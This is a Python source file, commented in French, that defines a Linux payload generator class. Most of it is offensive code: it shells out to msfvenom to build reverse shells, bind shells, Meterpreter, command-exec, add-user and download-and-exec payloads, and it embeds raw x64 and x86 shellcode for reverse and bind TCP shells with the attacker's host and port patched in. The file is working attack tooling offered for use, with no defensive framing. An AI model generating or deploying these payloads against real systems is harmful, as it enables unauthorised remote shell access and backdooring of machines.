#!/usr/bin/env python3
"""
Linux ELF Payload Generator
- Reverse shells
- Bind shells
- Meterpreter for Linux
"""

import struct
from typing import Optional

class LinuxPayloads:
    """
    Générateur de payloads Linux (ELF)
    """
    
    MSF_PAYLOADS = {
        'reverse_tcp': 'linux/x64/shell_reverse_tcp',
        'reverse_tcp_x86': 'linux/x86/shell_reverse_tcp',
        'bind_tcp': 'linux/x64/shell_bind_tcp',
        'meterpreter': 'linux/x64/meterpreter/reverse_tcp',
        'exec': 'linux/x64/exec',
        'adduser': 'linux/x64/adduser',
        'download_exec': 'linux/x64/download_exec',
    }
    
    def __init__(self, use_msf: bool = True):
        self.use_msf = use_msf
    
    def reverse_tcp_x64(self, lhost: str, lport: int) -> bytes:
        """
        Reverse shell TCP x64
        """
        if self.use_msf:
            return self._use_msfvenom('reverse_tcp', lhost, lport)
        
        # Shellcode reverse TCP x64 (74 bytes)
        # msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw
        shellcode = (
            b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
            b"\xb9\x02\x00" + struct.pack('>H', lport) +
            socket.inet_aton(lhost) +
            b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
            b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48"
            b"\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57"
            b"\x48\x89\xe6\x0f\x05"
        )
        return shellcode
    
    def reverse_tcp_x86(self, lhost: str, lport: int) -> bytes:
        """
        Reverse shell TCP x86 (68 bytes)
        """
        if self.use_msf:
            return self._use_msfvenom('reverse_tcp_x86', lhost, lport)
        
        ip_bytes = socket.inet_aton(lhost)
        port_bytes = struct.pack('>H', lport)
        
        shellcode = (
            b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06"
            b"\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xd2\x52"
            b"\x66\x68" + port_bytes +
            b"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
            b"\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56"
            b"\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd"
            b"\x80\x75\xf8\x31\xc0\x50\x40\x89\xe3\x50\x89\xe2\x53\x89\xe1"
            b"\xb0\x0b\xcd\x80"
        )
        return shellcode
    
    def bind_tcp(self, lport: int) -> bytes:
        """
        Bind shell TCP (écoute)
        """
        if self.use_msf:
            return self._use_msfvenom('bind_tcp', '', lport)
        
        port_bytes = struct.pack('>H', lport)
        
        shellcode = (
            b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
            b"\xc7\x04\x24\x02\x00" + port_bytes +
            b"\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f"
            b"\x05\x48\x31\xf6\x99\x6a\x2b\x58\x0f\x05\x50\x5f\x6a\x03\x5e"
            b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48"
            b"\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57"
            b"\x48\x89\xe6\x0f\x05"
        )
        return shellcode
    
    def exec(self, cmd: str) -> bytes:
        """
        Exécute une commande
        """
        if self.use_msf:
            return self._use_msfvenom_with_option('exec', 'CMD', cmd)
        return b""
    
    def add_user(self, username: str, password: str) -> bytes:
        """
        Ajoute un utilisateur
        """
        if self.use_msf:
            return self._use_msfvenom_with_option('adduser', 'USER', username, extra={'PASS': password})
        return b""
    
    def meterpreter_reverse_tcp(self, lhost: str, lport: int) -> bytes:
        """
        Meterpreter Linux
        """
        if self.use_msf:
            return self._use_msfvenom('meterpreter', lhost, lport)
        return b""
    
    def _use_msfvenom(self, payload_key: str, lhost: str, lport: int) -> bytes:
        """Utilise msfvenom"""
        import subprocess
        
        payload = self.MSF_PAYLOADS.get(payload_key, payload_key)
        cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'raw']
        
        try:
            result = subprocess.run(cmd, capture_output=True, check=True)
            return result.stdout
        except:
            return b""
    
    def _use_msfvenom_with_option(self, payload_key: str, option: str, value: str, extra: dict = None) -> bytes:
        """Utilise msfvenom avec options"""
        import subprocess
        
        payload = self.MSF_PAYLOADS.get(payload_key, payload_key)
        cmd = ['msfvenom', '-p', payload, f'{option}={value}']
        
        if extra:
            for k, v in extra.items():
                cmd.append(f'{k}={v}')
        
        cmd.extend(['-f', 'raw'])
        
        try:
            result = subprocess.run(cmd, capture_output=True, check=True)
            return result.stdout
        except:
            return b""


# Nécessaire pour socket.inet_aton
import socket